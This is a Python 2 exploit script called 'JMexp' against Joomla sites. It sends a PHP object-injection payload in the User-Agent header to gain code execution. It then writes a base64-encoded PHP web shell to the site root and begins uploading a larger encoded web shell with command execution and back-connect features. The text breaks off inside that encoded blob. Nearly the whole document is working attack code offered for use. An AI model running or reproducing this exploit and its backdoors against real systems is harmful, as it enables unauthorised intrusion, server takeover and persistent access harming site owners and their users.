# !/usr/bin/python
# coding=utf-8
# thanks for nlfox
# fixed by evil7
# 2015/12/16

import urllib
import re
import os
__author__ = 'nlfox233'
import urllib2
import cookielib
import sys

site = sys.argv[1]

os.system('clear')
print "     _ __  __"
print "    | |  \/  | _____  ___ __"
print " _  | | |\/| |/ _ \ \/ / '_ \\"
print "| |_| | |  | |  __/>  <| |_) |"
print " \___/|_|  |_|\___/_/\_\ .__/"
print "                       |_|   v:2015.12.16"
print ""
print "  >> JMexp running..."

code = "file_put_contents($_SERVER['DOCUMENT_ROOT'].'/JMexp.php',base64_decode('PD9waHAgaGVhZGVyKCJjb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGY4Iik7IGlmKGdldF9tYWdpY19xdW90ZXNfZ3BjKCkpIGZvcmVhY2goJF9QT1NUIGFzICRrPT4kdikgJF9QT1NUWyRrXSA9IHN0cmlwc2xhc2hlcygkdik7Pz48P3BocCBAZXZhbCgkX1BPU1RbJ0pNZXhwJ10pOz8+IA0KPGNlbnRlcj4NCklGIFVwZGF0ZSBXZWJzaGVsbCBOb3QgU3VlY2Nlc3MuPGJyPg0KWW91IENhbiBVcGxvYWQgRmlsZSBCeSBZb3VzZWxmLiA8YnI+DQpPciBVc2UgMUNvZGVTaGVsbCBXaXRoIFRoaXMgV2Vic2hlbGwuPGJyPg0KMUNvZGU6IEpNZXhwPGJyPjxicj4NCjxmb3JtIG1ldGhvZD0iUE9TVCI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJTYXZlX2l0Ij46PGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImZpbGUiIHNpemU9IjYwIiB2YWx1ZT0iPD9waHAgZWNobyBfX0ZJTEVfXzs/PiI+IA0KPGJyPjxicj4gDQo8dGV4dGFyZWEgbmFtZT0idGV4dCIgQ09MUz0iNzAiIFJPV1M9IjE4Ij48L3RleHRhcmVhPiANCjxmb3JtPg0KPC9jZW50ZXI+DQo8P3BocCBpZihpc3NldCgkX1BPU1RbJ3RleHQnXSkpeyRmcCA9IEBmb3BlbigkX1BPU1RbJ2ZpbGUnXSwnd2InKTtlY2hvIEBmd3JpdGUoJGZwLCRfUE9TVFsndGV4dCddKSA/ICdTdWVjY2VzcycgOiAnRmFpbCc7QGZjbG9zZSgkZnApO30/Pg0KPD9waHAgaWYoaXNzZXQoJF9QT1NUWydKTWRhdGEnXSkpeyRmcCA9IEBmb3BlbiggX19GSUxFX18sJ3diJyk7ZWNobyBAZndyaXRlKCRmcCxiYXNlNjRfZGVjb2RlKCRfUE9TVFsnSk1kYXRhJ10pKSA/ICdTdWVjY2VzcycgOiAnRmFpbCc7QGZjbG9zZSgkZnApO30/Pg=='))"

url = site + '?1=' + urllib.quote("@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo '->|';" + code + ";echo '|<-';")
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
urllib2.install_opener(opener)
urllib2.socket.setdefaulttimeout(10)

ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:46:"eval($_REQUEST[1]);JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'
req = urllib2.Request(url=url, headers={'User-Agent': ua})
opener.open(req)
req = urllib2.Request(url=url)
res = opener.open(req).read()

# Post New Webshell

print ""
print "  >> Upload Webshell..."

JMurl = site + '/JMexp.php'
JMdata = 'PD9waHAKLy9pbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsMSk7CkBlcnJvcl9yZXBvcnRpbmcoNyk7CkBzZXNzaW9uX3N0YXJ0KCk7CkBzZXRfdGltZV9saW1pdCgwKTsKQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTsKaWYoIHN0cnBvcyggc3RydG9sb3dlciggJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddICksICdib3QnICkgIT09IGZhbHNlICkgewoJaGVhZGVyKCdIVFRQLzEuMCA0MDQgTm90IEZvdW5kJyk7CglleGl0Owp9Cm9iX3N0YXJ0KCk7CiRtdGltZSA9IGV4cGxvZGUoJyAnLCBtaWNyb3RpbWUoKSk7CiRzdGFydHRpbWUgPSAkbXRpbWVbMV0gKyAkbXRpbWVbMF07CmRlZmluZSgnU0FfUk9PVCcsIHN0cl9yZXBsYWNlKCdcXCcsICcvJywgZGlybmFtZShfX0ZJTEVfXykpLicvJyk7CmRlZmluZSgnU0VMRicsICRfU0VSVkVSWydQSFBfU0VMRiddID8gJF9TRVJWRVJbJ1BIUF9TRUxGJ10gOiAkX1NFUlZFUlsnU0NSSVBUX05BTUUnXSk7CmRlZmluZSgnSVNfV0lOJywgRElSRUNUT1JZX1NFUEFSQVRPUiA9PSAnXFwnKTsKZGVmaW5lKCdJU19HUEMnLCBnZXRfbWFnaWNfcXVvdGVzX2dwYygpKTsKJGRpc19mdW5jID0gZ2V0X2NmZ192YXIoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CmRlZmluZSgnSVNfUEhQSU5GTycsICghZXJlZ2koInBocGluZm8iLCRkaXNfZnVuYykpID8gMSA6IDAgKTsKCmlmKCBJU19HUEMgKSB7CgkkX1BPU1QgPSBzX2FycmF5KCRfUE9TVCk7Cn0KJFAgPSAkX1BPU1Q7CnVuc2V0KCRfUE9TVCk7Ci8qPT09PT09PT09PT09PT09PT09PT09IOeoi+W6j+mFjee9riA9PT09PT09PT09PT09PT09PT09PT0qLwoKLy9lY2hvIGVuY29kZV9wYXNzKCdhbmdlbCcpO2V4aXQ7Ci8vYW5nZWwgPSBlYzM4ZmUyYTg0OTdlMGE4ZDZkMzQ5YjM1MzMwMzhjYgovLyDlpoLmnpzpnIDopoHlr4bnoIHpqozor4Es6K+35L+u5pS555m76ZmG5a+G56CBLOeVmeepuuS4uuS4jemcgOimgemqjOivgQokcGFzcyAgPSAnJzsgLy9hbmdlbAoKLy/lpoLmgqjlr7kgY29va2llIOS9nOeUqOiMg+WbtOacieeJueauiuimgeaxgiwg5oiW55m75b2V5LiN5q2j5bi4LCDor7fkv67mlLnkuIvpnaLlj5jph48sIOWQpuWImeivt+S/neaMgem7mOiupAovLyBjb29raWUg5YmN57yACiRjb29raWVwcmUgPSAnJzsKLy8gY29va2llIOS9nOeUqOWfnwokY29va2llZG9tYWluID0gJyc7Ci8vIGNvb2tpZSDkvZznlKjot6/lvoQKJGNvb2tpZXBhdGggPSAnLyc7Ci8vIGNvb2tpZSDmnInmlYjmnJ8KJGNvb2tpZWxpZmUgPSA4NjQwMDsKCi8qPT09PT09PT09PT09PT09PT09PT09IOmFjee9rue7k+adnyA9PT09PT09PT09PT09PT09PT09PT0qLwoKJGNoYXJzZXRkYiA9IGFycmF5KAoJJ2JpZzUnCQkJPT4gJ2JpZzUnLAoJJ2NwLTg2NicJCT0+ICdjcDg2NicsCgknZXVjLWpwJwkJPT4gJ3VqaXMnLAoJJ2V1Yy1rcicJCT0+ICdldWNrcicsCgknZ2JrJwkJCT0+ICdnYmsnLAoJJ2lzby04ODU5LTEnCT0+ICdsYXRpbjEnLAoJJ2tvaTgtcicJCT0+ICdrb2k4cicsCgkna29pOC11JwkJPT4gJ2tvaTh1JywKCSd1dGYtOCcJCQk9PiAndXRmOCcsCgknd2luZG93cy0xMjUyJwk9PiAnbGF0aW4xJywKKTsKCiRhY3QgPSBpc3NldCgkUFsnYWN0J10pID8gJFBbJ2FjdCddIDogJyc7CiRjaGFyc2V0ID0gaXNzZXQoJFBbJ2NoYXJzZXQnXSkgPyAkUFsnY2hhcnNldCddIDogJ2diayc7CiRkb2luZyA9IGlzc2V0KCRQWydkb2luZyddKSA/ICRQWydkb2luZyddIDogJyc7Cgpmb3IgKCRpPTE7JGk8PTQ7JGkrKykgewoJJHsncCcuJGl9ID0gaXNzZXQoJFBbJ3AnLiRpXSkgPyAkUFsncCcuJGldIDogJyc7Cn0KCmlmIChpc3NldCgkY2hhcnNldGRiWyRjaGFyc2V0XSkpIHsKCWhlYWRlcigiY29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9Ii4kY2hhcnNldCk7Cn0KCiR0aW1lc3RhbXAgPSB0aW1lKCk7CgovKiDouqvku73pqozor4EgKi8KaWYgKCRhY3QgPT0gImxvZ291dCIpIHsKCXNjb29raWUoJ2xvZ2lucGFzcycsICcnLCAtODY0MDAgKiAzNjUpOwoJQGhlYWRlcignTG9jYXRpb246ICcuU0VMRik7CglleGl0Owp9CmlmKCRwYXNzKSB7CglpZiAoJGFjdCA9PSAnbG9naW4nKSB7CgkJaWYgKCRwYXNzID09IGVuY29kZV9wYXNzKCRQWydwYXNzd29yZCddKSkgewoJCQlzY29va2llKCdsb2dpbnBhc3MnLGVuY29kZV9wYXNzKCRQWydwYXNzd29yZCddKSk7CgkJCUBoZWFkZXIoJ0xvY2F0aW9uOiAnLlNFTEYpOwoJCQlleGl0OwoJCX0KCX0KCWlmIChpc3NldCgkX0NPT0tJRVsnbG9naW5wYXNzJ10pKSB7CgkJaWYgKCRfQ09PS0lFWydsb2dpbnBhc3MnXSAhPSAkcGFzcykgewoJCQlsb2dpbnBhZ2UoKTsKCQl9Cgl9IGVsc2UgewoJCWxvZ2lucGFnZSgpOwoJfQp9Ci8qIOmqjOivgee7k+adnyAqLwoKJGVycm1zZyA9ICcnOwokdWNoYXIgPSAnJiM5NjUwOyc7CiRkY2hhciA9ICcmIzk2NjA7JzsKISRhY3QgJiYgJGFjdCA9ICdmaWxlJzsKCi8v5b2T5YmN55uu5b2VL+iuvue9ruW3peS9nOebruW9lS/nvZHnq5nmoLnnm67lvZUKJGhvbWVfY3dkID0gZ2V0Y3dkKCk7CmlmIChpc3NldCgkUFsnY3dkJ10pICYmICRQWydjd2QnXSkgewoJY2hkaXIoJFBbJ2N3ZCddKTsKfSBlbHNlIHsKCWNoZGlyKFNBX1JPT1QpOwp9CiRjd2QgPSBnZXRjd2QoKTsKJHdlYl9jd2QgPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwpmb3JlYWNoIChhcnJheSgnd2ViX2N3ZCcsJ2N3ZCcsJ2hvbWVfY3dkJykgYXMgJGspIHsKCWlmIChJU19XSU4pIHsKCQkkJGsgPSBzdHJfcmVwbGFjZSgnXFwnLCAnLycsICQkayk7Cgl9CglpZiAoc3Vic3RyKCQkaywgLTEpICE9ICcvJykgewoJCSQkayA9ICQkay4nLyc7Cgl9Cn0KCi8vIOafpeeci1BIUElORk8KaWYgKCRhY3QgPT0gJ3BocGluZm8nKSB7CglpZiAoSVNfUEhQSU5GTykgewoJCXBocGluZm8oKTsKCQlleGl0OwoJfSBlbHNlIHsKCQkkZXJybXNnID0gJ3BocGluZm8oKSBmdW5jdGlvbiBoYXMgZGlzYWJsZWQnOwoJfQp9CgppZighZnVuY3Rpb25fZXhpc3RzKCdzY2FuZGlyJykpIHsKCWZ1bmN0aW9uIHNjYW5kaXIoJGN3ZCkgewoJCSRmaWxlcyA9IGFycmF5KCk7CgkJJGRoID0gb3BlbmRpcigkY3dkKTsKCQl3aGlsZSAoJGZpbGUgPSByZWFkZGlyKCRkaCkpIHsKCQkJJGZpbGVzW10gPSAkZmlsZTsKCQl9CgkJcmV0dXJuICRmaWxlcyA/ICRmaWxlcyA6IDA7Cgl9Cn0KCmlmICgkYWN0ID09ICdkb3duJykgewoJaWYgKGlzX2ZpbGUoJHAxKSAmJiBpc19yZWFkYWJsZSgkcDEpKSB7CgkJQG9iX2VuZF9jbGVhbigpOwoJCSRmaWxlaW5mbyA9IHBhdGhpbmZvKCRwMSk7CgkJaWYgKGZ1bmN0aW9uX2V4aXN0cygnbWltZV9jb250ZW50X3R5cGUnKSkgewoJCQkkdHlwZSA9IEBtaW1lX2NvbnRlbnRfdHlwZSgkcDEpOwoJCQloZWFkZXIoIkNvbnRlbnQtVHlwZTogIi4kdHlwZSk7CgkJfSBlbHNlIHsKCQkJaGVhZGVyKCdDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL3gtJy4kZmlsZWluZm9bJ2V4dGVuc2lvbiddKTsKCQl9CgkJaGVhZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0nLiRmaWxlaW5mb1snYmFzZW5hbWUnXSk7CgkJaGVhZGVyKCdDb250ZW50LUxlbmd0aDogJy5zcHJpbnRmKCIldSIsIEBmaWxlc2l6ZSgkcDEpKSk7CgkJQHJlYWRmaWxlKCRwMSk7CgkJZXhpdDsKCX0gZWxzZSB7CgkJJGVycm1zZyA9ICdDYW5cJ3QgcmVhZCBmaWxlJzsKCQkkYWN0ID0gJ2ZpbGUnOwoJfQp9Cj8+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9PD9waHAgZWNobyAkY2hhcnNldDs/PiI+Cjx0aXRsZT48P3BocCBlY2hvICRhY3QuJyAtICcuJF9TRVJWRVJbJ0hUVFBfSE9TVCddOz8+PC90aXRsZT4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KYm9keSx0ZHtmb250OiAxMnB4IEFyaWFsLFRhaG9tYTtsaW5lLWhlaWdodDogMTZweDt9Ci5pbnB1dCwgc2VsZWN0e2ZvbnQ6MTJweCBBcmlhbCxUYWhvbWE7YmFja2dyb3VuZDojZmZmO2JvcmRlcjogMXB4IHNvbGlkICM2NjY7cGFkZGluZzoycHg7aGVpZ2h0OjIycHg7fQouYXJlYXtmb250OjEycHggJ0NvdXJpZXIgTmV3JywgTW9ub3NwYWNlO2JhY2tncm91bmQ6I2ZmZjtib3JkZXI6IDFweCBzb2xpZCAjNjY2O3BhZGRpbmc6MnB4O30KLnJlZHtjb2xvcjojZjAwO30KLmJsYWNre2NvbG9yOiMwMDA7fQouZ3JlZW57Y29sb3I6IzA5MDt9Ci5ie2ZvbnQtd2VpZ2h0OmJvbGQ7fQouYnQge2JvcmRlci1jb2xvcjojYjBiMGIwO2JhY2tncm91bmQ6IzNkM2QzZDtjb2xvcjojZmZmO2ZvbnQ6MTJweCBBcmlhbCxUYWhvbWE7aGVpZ2h0OjIycHg7fQphIHtjb2xvcjogIzAwZjt0ZXh0LWRlY29yYXRpb246bm9uZTt9CmE6aG92ZXJ7Y29sb3I6ICNmMDA7dGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZTt9Ci5hbHQxIHRke2JvcmRlci10b3A6MXB4IHNvbGlkICNmZmY7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgI2RkZDtiYWNrZ3JvdW5kOiNmMWYxZjE7cGFkZGluZzo1cHggMTVweCA1cHggNXB4O30KLmFsdDIgdGR7Ym9yZGVyLXRvcDoxcHggc29saWQgI2ZmZjtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZGRkO2JhY2tncm91bmQ6I2Y5ZjlmOTtwYWRkaW5nOjVweCAxNXB4IDVweCA1cHg7fQouZm9jdXMgdGR7Ym9yZGVyLXRvcDoxcHggc29saWQgI2ZmZjtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZGRkO2JhY2tncm91bmQ6I2ZmYTtwYWRkaW5nOjVweCAxNXB4IDVweCA1cHg7fQouaGVhZCB0ZHtib3JkZXItdG9wOjFweCBzb2xpZCAjZmZmO2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNkZGQ7YmFja2dyb3VuZDojZTllOWU5O3BhZGRpbmc6NXB4IDE1cHggNXB4IDVweDtmb250LXdlaWdodDpib2xkO30KLmhlYWQgdGQgc3Bhbntmb250LXdlaWdodDpub3JtYWw7fQouaW5mb2xpc3Qge3BhZGRpbmc6MTBweDttYXJnaW46MTBweCAwIDIwcHggMDtiYWNrZ3JvdW5kOiNGMUYxRjE7Ym9yZGVyOjFweCBzb2xpZCAjZGRkO30KZm9ybXttYXJnaW46MDtwYWRkaW5nOjA7fQpoMnttYXJnaW46MDtwYWRkaW5nOjA7aGVpZ2h0OjI0cHg7bGluZS1oZWlnaHQ6MjRweDtmb250LXNpemU6MTRweDtjb2xvcjojNUI2ODZGO30KdWwuaW5mbyBsaXttYXJnaW46MDtjb2xvcjojNDQ0O2xpbmUtaGVpZ2h0OjI0cHg7aGVpZ2h0OjI0cHg7fQp1e3RleHQtZGVjb3JhdGlvbjogbm9uZTtjb2xvcjojNzc3O2Zsb2F0OmxlZnQ7ZGlzcGxheTpibG9jazt3aWR0aDoxNTBweDttYXJnaW4tcmlnaHQ6MTBweDt9Ci5kcml2ZXN7cGFkZGluZzo1cHg7fQouZHJpdmVzIHNwYW4ge21hcmdpbjphdXRvIDdweDt9Cjwvc3R5bGU+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KZnVuY3Rpb24gY2hlY2thbGwoZm9ybSkgewoJZm9yKHZhciBpPTA7aTxmb3JtLmVsZW1lbnRzLmxlbmd0aDtpKyspIHsKCQl2YXIgZSA9IGZvcm0uZWxlbWVudHNbaV07CiAgICAgICAgaWYgKGUudHlwZSA9PSAnY2hlY2tib3gnKSB7CgkJCWlmIChlLm5hbWUgIT0gJ2Noa2FsbCcgJiYgZS5uYW1lICE9ICdzYXZlYXNmaWxlJykKCQkJCWUuY2hlY2tlZCA9IGZvcm0uY2hrYWxsLmNoZWNrZWQ7CgkJfQogICAgfQp9CmZ1bmN0aW9uICQoaWQpIHsKCXJldHVybiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZCk7Cn0KZnVuY3Rpb24gY3JlYXRlZGlyKCl7Cgl2YXIgbmV3ZGlybmFtZTsKCW5ld2Rpcm5hbWUgPSBwcm9tcHQoJ1BsZWFzZSBpbnB1dCB0aGUgZGlyZWN0b3J5IG5hbWU6JywgJycpOwoJaWYgKCFuZXdkaXJuYW1lKSByZXR1cm47CglnKG51bGwsbnVsbCwnY3JlYXRlZGlyJyxuZXdkaXJuYW1lKTsKfQpmdW5jdGlvbiBmaWxlcGVybShwZmlsZSwgdmFsKXsKCXZhciBuZXdwZXJtOwoJbmV3cGVybSA9IHByb21wdCgnQ3VycmVudCBkaXIvZmlsZTonK3BmaWxlKydcblBsZWFzZSBpbnB1dCBuZXcgcGVybWlzc2lvbnM6JywgdmFsKTsKCWlmICghbmV3cGVybSkgcmV0dXJuOwoJZyhudWxsLG51bGwsJ2ZpbGVwZXJtJyxwZmlsZSxuZXdwZXJtKTsKfQpmdW5jdGlvbiByZW5hbWUob2xkbmFtZSl7Cgl2YXIgbmV3ZmlsZW5hbWU7CgluZXdmaWxlbmFtZSA9IHByb21wdCgnRmlsZW5hbWU6JytvbGRuYW1lKydcblBsZWFzZSBpbnB1dCBuZXcgZmlsZW5hbWU6JywgJycpOwoJaWYgKCFuZXdmaWxlbmFtZSkgcmV0dXJuOwoJZyhudWxsLG51bGwsJ3JlbmFtZScsbmV3ZmlsZW5hbWUsb2xkbmFtZSk7Cn0KZnVuY3Rpb24gY3JlYXRlZmlsZSgpewoJdmFyIGZpbGVuYW1lOwoJZmlsZW5hbWUgPSBwcm9tcHQoJ1BsZWFzZSBpbnB1dCB0aGUgZmlsZSBuYW1lOicsICcnKTsKCWlmICghZmlsZW5hbWUpIHJldHVybjsKCWcoJ2VkaXRmaWxlJywgbnVsbCwgbnVsbCwgZmlsZW5hbWUpOwp9CmZ1bmN0aW9uIHNldGRiKGRibmFtZSkgewoJaWYoIWRibmFtZSkgcmV0dXJuOwoJJCgnZGJmb3JtJykudGFibGVuYW1lLnZhbHVlPScnOwoJJCgnZGJmb3JtJykuZG9pbmcudmFsdWU9Jyc7CglpZiAoJCgnZGJmb3JtJykuc3FsX3F1ZXJ5KQoJewoJCSQoJ2RiZm9ybScpLnNxbF9xdWVyeS52YWx1ZT0nJzsKCX0KCSQoJ2RiZm9ybScpLnN1Ym1pdCgpOwp9CmZ1bmN0aW9uIHNldHNvcnQoaykgewoJJCgnZGJmb3JtJykub3JkZXIudmFsdWU9azsKCSQoJ2RiZm9ybScpLnN1Ym1pdCgpOwp9CmZ1bmN0aW9uIHNldHRhYmxlKHRhYmxlbmFtZSxkb2luZykgewoJaWYoIXRhYmxlbmFtZSkgcmV0dXJuOwoJaWYgKGRvaW5nKSB7CgkJJCgnZGJmb3JtJykuZG9pbmcudmFsdWU9ZG9pbmc7Cgl9IGVsc2UgewoJCSQoJ2RiZm9ybScpLmRvaW5nLnZhbHVlPScnOwoJfQoJJCgnZGJmb3JtJykuc3FsX3F1ZXJ5LnZhbHVlPScnOwoJJCgnZGJmb3JtJykudGFibGVuYW1lLnZhbHVlPXRhYmxlbmFtZTsKCSQoJ2RiZm9ybScpLnN1Ym1pdCgpOwp9CmZ1bmN0aW9uIHMoYWN0LGN3ZCxwMSxwMixwMyxwNCxjaGFyc2V0KSB7CglpZihhY3QgIT0gbnVsbCkgJCgnb3Bmb3JtJykuYWN0LnZhbHVlPWFjdDsKCWlmKGN3ZCAhPSBudWxsKSAkKCdvcGZvcm0nKS5jd2QudmFsdWU9Y3dkOwoJaWYocDEgIT0gbnVsbCkgJCgnb3Bmb3JtJykucDEudmFsdWU9cDE7CglpZihwMiAhPSBudWxsKSAkKCdvcGZvcm0nKS5wMi52YWx1ZT1wMjsKCWlmKHAzICE9IG51bGwpICQoJ29wZm9ybScpLnAzLnZhbHVlPXAzOwoJaWYocDQgIT0gbnVsbCkgeyQoJ29wZm9ybScpLnA0LnZhbHVlPXA0O31lbHNleyQoJ29wZm9ybScpLnA0LnZhbHVlPScnO30KCWlmKGNoYXJzZXQgIT0gbnVsbCkgJCgnb3Bmb3JtJykuY2hhcnNldC52YWx1ZT1jaGFyc2V0Owp9CmZ1bmN0aW9uIGcoYWN0LGN3ZCxwMSxwMixwMyxwNCxjaGFyc2V0KSB7CglzKGFjdCxjd2QscDEscDIscDMscDQsY2hhcnNldCk7CgkkKCdvcGZvcm0nKS5zdWJtaXQoKTsKfQo8L3NjcmlwdD4KPC9oZWFkPgo8Ym9keSBzdHlsZT0ibWFyZ2luOjA7dGFibGUtbGF5b3V0OmZpeGVkOyB3b3JkLWJyZWFrOmJyZWFrLWFsbCI+Cjw/cGhwCgpmb3JtaGVhZChhcnJheSgnbmFtZSc9PidvcGZvcm0nKSk7Cm1ha2VoaWRlKCdhY3QnLCAkYWN0KTsKbWFrZWhpZGUoJ2N3ZCcsICRjd2QpOwptYWtlaGlkZSgncDEnLCAkcDEpOwptYWtlaGlkZSgncDInLCAkcDIpOwptYWtlaGlkZSgncDMnLCAkcDMpOwptYWtlaGlkZSgncDQnLCAkcDQpOwptYWtlaGlkZSgnY2hhcnNldCcsICRjaGFyc2V0KTsKZm9ybWZvb3QoKTsKCmlmKCFmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSkgewoJJHVzZXIgPSBAZ2V0X2N1cnJlbnRfdXNlcigpOwoJJHVpZCA9IEBnZXRteXVpZCgpOwoJJGdpZCA9IEBnZXRteWdpZCgpOwoJJGdyb3VwID0gIj8iOwp9IGVsc2UgewoJJHVpZCA9IEBwb3NpeF9nZXRwd3VpZChAcG9zaXhfZ2V0ZXVpZCgpKTsKCSRnaWQgPSBAcG9zaXhfZ2V0Z3JnaWQoQHBvc2l4X2dldGVnaWQoKSk7CgkkdWlkID0gJHVpZFsndWlkJ107CgkkdXNlciA9ICR1aWRbJ25hbWUnXTsKCSRnaWQgPSAkZ2lkWydnaWQnXTsKCSRncm91cCA9ICRnaWRbJ25hbWUnXTsKfQo/Pgo8dGFibGUgd2lkdGg9IjEwMCUiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIj4KCTx0ciBjbGFzcz0iaGVhZCI+CgkJPHRkPjxzcGFuIHN0eWxlPSJmbG9hdDpyaWdodDsiPjw/cGhwIGVjaG8gQHBocF91bmFtZSgpOz8+IC8gVXNlcjo8P3BocCBlY2hvICR1aWQuJyAoICcuJHVzZXIuJyApIC8gR3JvdXA6ICcuJGdpZC4nICggJy4kZ3JvdXAuJyApJzs/Pjwvc3Bhbj48P3BocCBlY2hvICRfU0VSVkVSWydIVFRQX0hPU1QnXTs/PiAoPD9waHAgZWNobyBnZXRob3N0YnluYW1lKCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKTs/Pik8L3RkPgoJPC90cj4KCTx0ciBjbGFzcz0iYWx0MSI+CgkJPHRkPgoJCQk8c3BhbiBzdHlsZT0iZmxvYXQ6cmlnaHQ7Ij5DaGFyc2V0OgoJCQk8P3BocAoJCQltYWtlc2VsZWN0KGFycmF5KCduYW1lJz0+J2NoYXJzZXQnLCdvcHRpb24nPT4kY2hhcnNldGRiLCdzZWxlY3RlZCc9PiRjaGFyc2V0LCdvbmNoYW5nZSc9PidnKG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLHRoaXMudmFsdWUpOycpKTsKCQkJPz4KCQkJPC9zcGFuPgoJCQk8YSBocmVmPSJqYXZhc2NyaXB0OmcoJ2xvZ291dCcpOyI+TG9nb3V0PC9hPiB8CgkJCTxhIGhyZWY9ImphdmFzY3JpcHQ6ZygnZmlsZScsbnVsbCwnJywnJywnJywnJywnPD9waHAgZWNobyAkY2hhcnNldDs/PicpOyI+RmlsZSBNYW5hZ2VyPC9hPiB8CgkJCTxhIGhyZWY9ImphdmFzY3JpcHQ6ZygnbXlzcWxhZG1pbicsbnVsbCwnJywnJywnJywnJywnPD9waHAgZWNobyAkY2hhcnNldDs/PicpOyI+TVlTUUwgTWFuYWdlcjwvYT4gfAoJCQk8YSBocmVmPSJqYXZhc2NyaXB0OmcoJ3NoZWxsJyxudWxsLCcnLCcnLCcnLCcnLCc8P3BocCBlY2hvICRjaGFyc2V0Oz8+Jyk7Ij5FeGVjdXRlIENvbW1hbmQ8L2E+IHwKCQkJPGEgaHJlZj0iamF2YXNjcmlwdDpnKCdwaHBlbnYnLG51bGwsJycsJycsJycsJycsJzw/cGhwIGVjaG8gJGNoYXJzZXQ7Pz4nKTsiPlBIUCBWYXJpYWJsZTwvYT4gfAoJCQk8YSBocmVmPSJqYXZhc2NyaXB0OmcoJ3BvcnRzY2FuJyxudWxsLCcnLCcnLCcnLCcnLCc8P3BocCBlY2hvICRjaGFyc2V0Oz8+Jyk7Ij5Qb3J0IFNjYW48L2E+IHwKCQkJPGEgaHJlZj0iamF2YXNjcmlwdDpnKCdzZWNpbmZvJyxudWxsLCcnLCcnLCcnLCcnLCc8P3BocCBlY2hvICRjaGFyc2V0Oz8+Jyk7Ij5TZWN1cml0eSBpbmZvcm1hdGlvbjwvYT4gfAoJCQk8YSBocmVmPSJqYXZhc2NyaXB0OmcoJ2V2YWwnLG51bGwsJycsJycsJycsJycsJzw/cGhwIGVjaG8gJGNoYXJzZXQ7Pz4nKTsiPkV2YWwgUEhQIENvZGU8L2E+CgkJCTw/cGhwIGlmICghSVNfV0lOKSB7Pz4gfCA8YSBocmVmPSJqYXZhc2NyaXB0OmcoJ2JhY2tjb25uZWN0JyxudWxsLCcnLCcnLCcnLCcnLCc8P3BocCBlY2hvICRjaGFyc2V0Oz8+Jyk7Ij5CYWNrIENvbm5lY3Q8L2E+PD9waHAgfT8+CgkJPC90ZD4KCTwvdHI+CjwvdGFibGU+Cjx0YWJsZSB3aWR0aD0iMTAwJSIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMTUiIGNlbGxzcGFjaW5nPSIwIj48dHI+PHRkPgo8P3BocAokZXJybXNnICYmIG0oJGVycm1zZyk7CgppZiAoJGFjdCA9PSAnZmlsZScpIHsKCgkvLyDliKTmlq3lvZPliY3nm67lvZXlj6/lhpnmg4XlhrUKCSRkaXJfd3JpdGVhYmxlID0gQGlzX3dyaXRhYmxlKCRjd2QpID8gJ1dyaXRhYmxlJyA6ICdOb24td3JpdGFibGUnOwoJaWYgKGlzc2V0KCRwMSkpIHsKCQlzd2l0Y2goJHAxKSB7CgkJCWNhc2UgJ2NyZWF0ZWRpcic6CgkJCQkvLyDliJvlu7rnm67lvZUKCQkJCWlmICgkcDIpIHsKCQkJCQltKCdEaXJlY3RvcnkgY3JlYXRlZCAnLihAbWtkaXIoJGN3ZC4kcDIsMDc3NykgPyAnc3VjY2VzcycgOiAnZmFpbGVkJykpOwoJCQkJfQoJCQkJYnJlYWs7CgkJCWNhc2UgJ3VwbG9hZEZpbGUnOgoJCQkJLy8g5LiK5Lyg5paH5Lu2CgkJCQltKCdGaWxlIHVwbG9hZCAnLihAbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VwbG9hZGZpbGUnXVsndG1wX25hbWUnXSwgJGN3ZC4nLycuJF9GSUxFU1sndXBsb2FkZmlsZSddWyduYW1lJ10pID8gJ3N1Y2Nlc3MnIDogJ2ZhaWxlZCcpKTsKCQkJCWJyZWFrOwoJCQljYXNlICdmaWxlcGVybSc6CgkJCQkvLyDnvJbovpHmlofku7blsZ7mgKcKCQkJCWlmICgkcDIgJiYgJHAzKSB7CgkJCQkJJHAzID0gYmFzZV9jb252ZXJ0KCRwMywgOCwgMTApOwoJCQkJCW0oJ1NldCBmaWxlIHBlcm1pc3Npb25zICcuKEBjaG1vZCgkcDIsICRwMykgPyAnc3